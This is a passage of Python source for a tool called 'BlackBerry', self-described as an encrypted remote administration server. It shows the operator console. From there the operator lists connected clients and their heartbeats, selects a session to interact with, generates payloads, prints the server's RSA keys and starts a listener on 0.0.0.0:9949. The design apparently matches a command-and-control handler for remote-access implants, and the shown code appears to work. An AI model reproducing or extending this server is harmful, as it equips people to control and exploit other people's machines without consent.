                        print(f"  {B_YELLOW}D Sent:{RESET} {format_bytes(sent_raw)}  |  {B_YELLOW}D Recv:{RESET} {format_bytes(recv_raw)}")
                        print(f"  {B_MAGENTA}C Sent:{RESET} {format_bytes(sent_comp)}  |  {B_MAGENTA}C Recv:{RESET} {format_bytes(recv_comp)}")
                        print(f"  {B_CYAN}Heartbeats:{RESET} {B_GREEN}{hb_count}{RESET}  |  {B_CYAN}Viva:{RESET} {format_uptime(age)}")
                        print(f"\n{B_CYAN}{'-'*50}{RESET}")
                    print()

        elif cmd == "new-cert" or cmd == "cert new":
            try:
                import certG
            except KeyboardInterrupt:
                print()
                continue           
            except FileNotFoundError:
                print(f"{ALERT} {RED}Error: No se encontró certG.py{RESET}")
            except Exception as e:
                print(f"{ALERT} {RED}Error ejecutando certG.py: {e}{RESET}")

        elif cmd == "cert":
            CERT_PATH = f'{script_dir}/cert/BlackBerry_Server.crt'
            KEY_PATH  = f'{script_dir}/cert/BlackBerry_Server.key'
            print("="*85)
            mostrar_info_cert(CERT_PATH)
            mostrar_info_key(KEY_PATH)
            
        elif cmd == "rsa-keys":
            try:
                priv_pem = SERVER_PRIVATE_KEY.private_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PrivateFormat.PKCS8,
                    encryption_algorithm=serialization.NoEncryption()
                )
                print(f"{B_GREEN}--- RSA Private Key (PEM) ---{RESET}\n{priv_pem.decode()}")
                print(f"{B_GREEN}--- RSA Public Key (PEM) ---{RESET}\n{SERVER_PUBLIC_PEM.decode()}")
            except Exception as e:
                print(f"{ALERT} {RED}Error mostrando claves RSA: {e}{RESET}")

        elif cmd.startswith("select "):
            parts = cmd.split()
            if len(parts) != 2:
                print(f"{ALERT} {RED}Uso: select <ID>{RESET}")
                continue
            try:
                cid = int(parts[1])
            except ValueError:
                print(f"{ALERT} {RED}ID inválido.{RESET}")
                continue

            with conn_lock:
                if cid not in connections:
                    print(f"{ALERT} {RED}Conexión no encontrada.{RESET}")
                    continue
                session = connections[cid]

            interact_with_client(cid, session)

        elif cmd.startswith("set port "):
            parts = cmd.split()
            if len(parts) != 3:
                print(f"{ALERT} {RED}Uso: set port <PUERTO>{RESET}")
                continue
            try:
                new_port = int(parts[2])
                if not (1 <= new_port <= 65535):
                    print(f"{ALERT} {RED}Puerto debe estar entre 1 y 65535{RESET}")
                    continue
                rebind_server(HOST, new_port)
            except ValueError:
                print(f"{ALERT} {RED}El puerto debe ser un número entero.{RESET}")
            except Exception as e:
                print(f"{ALERT} {RED}Error cambiando puerto: {e}{RESET}")

        elif cmd.startswith("set host "):
            parts = cmd.split()
            if len(parts) != 3:
                print(f"{ALERT} {RED}Uso: set host <HOST>{RESET}")
                continue
            new_host = parts[2]
            try:
                rebind_server(new_host, PORT)
            except Exception as e:
                print(f"{ALERT} {RED}Error cambiando host: {e}{RESET}")

        elif cmd == "generate-payload" or cmd == "payload":
            try:
                import payloadG
                payloadG.generate_payload()
            except KeyboardInterrupt:
                print()
                continue
            except ImportError:
                print(f"{ALERT} {RED}Error: No se encontró el módulo payloadG.{RESET}")
            except Exception as e:
                print(f"{ALERT} {RED}Error generando payload: {e}{RESET}")
                
        elif base_cmd == "block" and len(parts) == 2:
            ip = parts[1]
            if block_ip(ip):
                print(f"{B_GREEN}[+] Proceso de bloqueo completado para {ip}{RESET}")
            else:
                print(f"{RED}Error bloqueando {ip}{RESET}")

        elif base_cmd == "unblock" and len(parts) == 2:
            ip = parts[1]
            if unblock_ip(ip):
                print(f"{B_GREEN}[+] Proceso de desbloqueo completado para {ip}{RESET}")
            else:
                print(f"{RED}Error desbloqueando {ip}{RESET}")

        elif base_cmd == "blocklist":
            with blocked_ips_lock, temp_bans_lock:
                print(f"{B_CYAN}=== Bloqueos persistentes ==={RESET}")
                if blocked_ips:
                    for ip in sorted(blocked_ips):
                        print(f" - {ip}")
                else:
                    print(" (ninguna)")

                print(f"\n{B_YELLOW}=== Bloqueos temporales ==={RESET}")
                now = time.time()
                if temp_bans:
                    for ip, exp in temp_bans.items():
                        remaining = int(exp - now)
                        if remaining > 0:
                            print(f" - {ip} (expira en {remaining}s)")
                else:
                    print(" (ninguna)")

        elif cmd == "save-blocklist":
            if save_blocked_ips():
                print(f"{B_GREEN}[+] Lista de IPs guardada{RESET}")
            else:
                print(f"{ALERT} {RED}Error guardando lista de IPs{RESET}")

        elif cmd.lower() == "exit":
            print(f"{YELLOW}{BOLD}Saliendo de BlackBerry...{RESET}")
            
            with conn_lock:
                for cid, session in list(connections.items()):
                    try:
                        session.socket.close()
                    except Exception:
                        pass
                connections.clear()
            
            with server_socket_lock:
                if server_socket:
                    try:
                        server_socket.close()
                    except Exception:
                        pass
            
            cleanup_session_state()
            break

        else:
            # Ejecución segura con subprocess por defecto
            result = execute_local_command_safe(cmd)
            print(result)

def parse_arguments():
    """Parsea argumentos de línea de comandos"""
    parser = argparse.ArgumentParser(
        description='BlackBerry - Servidor de administración remota RSA-OEAP(AES-GCM)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos de uso:
  python3 BlackBerry.py                      # Modo silencioso por defecto
  python3 BlackBerry.py -p                   # RSA persistente
  python3 BlackBerry.py -v                   # Modo DEBUG completo
  python3 BlackBerry.py -vv                  # Modo VERBOSE relajado
  python3 BlackBerry.py -p -vv               # RSA persistente + verbose
  python3 BlackBerry.py --host 192.168.1.5   # Host específico
  python3 BlackBerry.py --port 8080          # Puerto específico
  python3 BlackBerry.py -H 0.0.0.0 -P 9999   # Host y puerto específicos
        """
    )
    
    parser.add_argument('-p', '--persistente', action='store_true',
                       help='Usar claves RSA persistentes desde rsa-cert/')
    parser.add_argument('-v', '--verbose', action='count', default=0,
                       help='Aumentar verbosidad (-v=DEBUG, -vv=VERBOSE)')
    parser.add_argument('-H', '--host', type=str, default='0.0.0.0',
                       help='Host de escucha (default: 0.0.0.0)')
    parser.add_argument('-P', '--port', type=int, default=9949,
                       help='Puerto de escucha (default: 9949)')
    
    return parser.parse_args()

def main():
    global server_socket, SERVER_PRIVATE_KEY, SERVER_PUBLIC_PEM, VERBOSE_MODE, HOST, PORT

    args = parse_arguments()
    
    persistent_mode = args.persistente
    VERBOSE_MODE = min(args.verbose, 2)
    HOST = args.host
    PORT = args.port

    if PORT < 1 or PORT > 65535:
        print(f"{ALERT} {RED}Error: Puerto debe estar entre 1 y 65535{RESET}")
        return 1

    setup_logging(verbose=VERBOSE_MODE)

    if not PROMPT_TOOLKIT_AVAILABLE:
        print(f"{YELLOW}[!] Para mejor experiencia, instala: pip install prompt_toolkit{RESET}")

    if is_server_running():
        print(f"{B_YELLOW}[!] Detectada instancia previa del servidor{RESET}")
        prev_state = load_session_state()
        if prev_state:
            print(f"{B_CYAN}[INFO] Servidor anterior en {prev_state['host']}:{prev_state['port']}")
            print(f"       {prev_state['connections_count']} conexiones activas{RESET}")
        print(f"{B_GREEN}[+] Reutilizando configuración del servidor...{RESET}")

    atexit.register(cleanup_session_state)

    try:
        SERVER_PRIVATE_KEY, SERVER_PUBLIC_PEM = load_or_generate_rsa_keys(persistent=persistent_mode)
        
        if not persistent_mode:
            print(f"{B_YELLOW}[!] Modo temporal: Claves RSA en memoria{RESET}")
            print(f"{B_YELLOW}    (usa -p para RSA consistente){RESET}")
    except Exception as e:
        logging.critical("No se pudo generar/cargar claves RSA: %s", e)
        print(f"{ALERT} {RED}Error fatal: No se pudo inicializar claves RSA{RESET}")
        cleanup_session_state()
        return 1

    load_blocked_ips()
    load_service_banner()

    try:
        with server_socket_lock:
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server_socket.bind((HOST, PORT))
            server_socket.listen(50)
        
        logging.info("Servidor escuchando en %s:%s", HOST, PORT)
        print(f"{B_GREEN}[+] Servidor iniciado en {HOST}:{PORT}{RESET}")
        
        if VERBOSE_MODE == 1:
            print(f"{B_CYAN}[DEBUG] Modo DEBUG completo activado{RESET}")
        elif VERBOSE_MODE == 2:
            print(f"{B_CYAN}[VERBOSE] Modo VERBOSE relajado activado{RESET}")
        else:
            print(f"{B_CYAN}[SILENCIOSO] (usa -v o -vv para más logs){RESET}")
            
    except PermissionError:
        logging.critical("Permiso denegado para vincular a %s:%s", HOST, PORT)
        print(f"{ALERT} {RED}Error: Permiso denegado. ¿Puerto privilegiado?{RESET}")
        cleanup_session_state()
        return 1
    except OSError as e:
        if "Address already in use" in str(e):
            logging.critical("Puerto %s ya en uso", PORT)
            print(f"{ALERT} {RED}Error: Puerto {PORT} ya en uso{RESET}")
        else:
            logging.critical("Error iniciando servidor: %s", e)
            print(f"{ALERT} {RED}Error fatal: {e}{RESET}")
        cleanup_session_state()
        return 1
    except Exception as e:
        logging.critical("Error inesperado: %s", e)
        print(f"{ALERT} {RED}Error fatal iniciando servidor{RESET}")
        cleanup_session_state()
        return 1

    threading.Thread(target=accept_connections, args=(server_socket,), daemon=True).start()
    
    try:
        interactive_shell()
    except Exception as e:
        logging.critical("Error en shell interactivo: %s", e)
        print(f"{ALERT} {RED}Error crítico en shell{RESET}")
        cleanup_session_state()
        return 1
    
    return 0

if __name__ == '__main__':
    try:
        exit_code = main()
        sys.exit(exit_code)
    except KeyboardInterrupt:
        print(f"\n{YELLOW}Interrupción detectada. Saliendo...{RESET}")
        with conn_lock:
            for cid, session in list(connections.items()):
                try:
                    session.socket.close()
                except Exception:
                    pass
        if server_socket:
            try:
                server_socket.close()
            except Exception:
                pass
        cleanup_session_state()
        sys.exit(0)
    except Exception as e:
        logging.critical("Excepción no capturada: %s", e, exc_info=True)
        print(f"{ALERT} {RED}Error crítico no manejado{RESET}")
        cleanup_session_state()
        sys.exit(1)
